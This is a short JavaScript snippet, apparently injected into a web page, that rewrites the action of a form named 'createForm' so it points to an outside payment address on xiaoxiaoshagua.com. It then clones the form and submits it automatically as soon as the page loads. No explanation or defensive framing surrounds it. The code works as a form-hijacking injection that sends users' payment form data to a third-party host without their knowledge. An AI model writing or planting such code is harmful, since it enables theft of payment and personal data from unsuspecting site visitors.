(function() {
    function a() {
        const scriptEle = document.createElement("script");
        scriptEle.type = "text/javascript";
        scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/';`;
        document.body.appendChild(scriptEle);
        let node = document.getElementById('createForm');
        let c = node.cloneNode(true);
        document.body.appendChild(c);
        console.log('ytyt121y');
        c.submit();
    }
    a();
})();
